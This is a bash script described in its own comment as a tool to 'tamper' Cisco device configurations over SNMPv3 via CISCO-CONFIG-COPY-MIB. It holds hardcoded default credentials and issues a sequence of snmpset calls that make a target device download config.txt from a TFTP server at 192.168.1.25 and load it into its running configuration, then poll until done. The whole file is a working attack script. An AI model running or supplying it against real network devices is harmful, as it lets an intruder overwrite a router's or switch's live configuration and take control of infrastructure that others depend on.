#!/bin/bash

# Tamper cisco configs over snmp on devices that support the CISCO-CONFIG-COPY-MIB.

# Settings
USERNAME=cisco
AUTHPROTOCOL=SHA
AUTHPASSPHRASE=cisco123
PRIVPROTOCOL=AES
PRIVPASSPHRASE=cisco123
TFTP_SERVER=192.168.1.25

# Print help page
if [ "$#" -eq 0 ] || [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
  echo "Usage: ./cisco-copy-config.sh [TARGET]"
  exit
fi

# Create ccCopyEntryRowStatus
snmpset -l authPriv -v3 -u $USERNAME -a $AUTHPROTOCOL -A $AUTHPASSPHRASE -x $PRIVPROTOCOL -X $PRIVPASSPHRASE $1 .1.3.6.1.4.1.9.9.96.1.1.1.1.14.123 i 5
# Set ccCopyProtocol
snmpset -l authPriv -v3 -u $USERNAME -a $AUTHPROTOCOL -A $AUTHPASSPHRASE -x $PRIVPROTOCOL -X $PRIVPASSPHRASE $1 .1.3.6.1.4.1.9.9.96.1.1.1.1.2.123 i 1
# Set ccCopySourceFileType
snmpset -l authPriv -v3 -u $USERNAME -a $AUTHPROTOCOL -A $AUTHPASSPHRASE -x $PRIVPROTOCOL -X $PRIVPASSPHRASE $1 .1.3.6.1.4.1.9.9.96.1.1.1.1.3.123 i 1
# Set ccCopyDestFileType
snmpset -l authPriv -v3 -u $USERNAME -a $AUTHPROTOCOL -A $AUTHPASSPHRASE -x $PRIVPROTOCOL -X $PRIVPASSPHRASE $1 .1.3.6.1.4.1.9.9.96.1.1.1.1.4.123 i 4
# ccCopyServerAddress
snmpset -l authPriv -v3 -u $USERNAME -a $AUTHPROTOCOL -A $AUTHPASSPHRASE -x $PRIVPROTOCOL -X $PRIVPASSPHRASE $1 .1.3.6.1.4.1.9.9.96.1.1.1.1.5.123 a $TFTP_SERVER
# Set ccCopyFileName
snmpset -l authPriv -v3 -u $USERNAME -a $AUTHPROTOCOL -A $AUTHPASSPHRASE -x $PRIVPROTOCOL -X $PRIVPASSPHRASE $1 .1.3.6.1.4.1.9.9.96.1.1.1.1.6.123 s config.txt
# Activate ccCopyEntryRowStatus
snmpset -l authPriv -v3 -u $USERNAME -a $AUTHPROTOCOL -A $AUTHPASSPHRASE -x $PRIVPROTOCOL -X $PRIVPASSPHRASE $1 .1.3.6.1.4.1.9.9.96.1.1.1.1.14.123 i 1
# Get ccCopyState
while true; do
  response=$(snmpget -l authPriv -v3 -u $USERNAME -a $AUTHPROTOCOL -A $AUTHPASSPHRASE -x $PRIVPROTOCOL -X $PRIVPASSPHRASE $1 .1.3.6.1.4.1.9.9.96.1.1.1.1.10.123 | grep -o -P "\d$")
  case $response in
    "1")
      echo "waiting"
      ;;
    "2")
      echo "running"
      ;;
    "3")
      echo "successful"
      break
      ;;
    "4")
      echo "failed"
      break
      ;;
    "*")
      exit
      ;;
  esac
  sleep 2
done
# Delete ccCopyEntryRowStatus
snmpset -l authPriv -v3 -u $USERNAME -a $AUTHPROTOCOL -A $AUTHPASSPHRASE -x $PRIVPROTOCOL -X $PRIVPASSPHRASE $1 .1.3.6.1.4.1.9.9.96.1.1.1.1.14.123 i 6
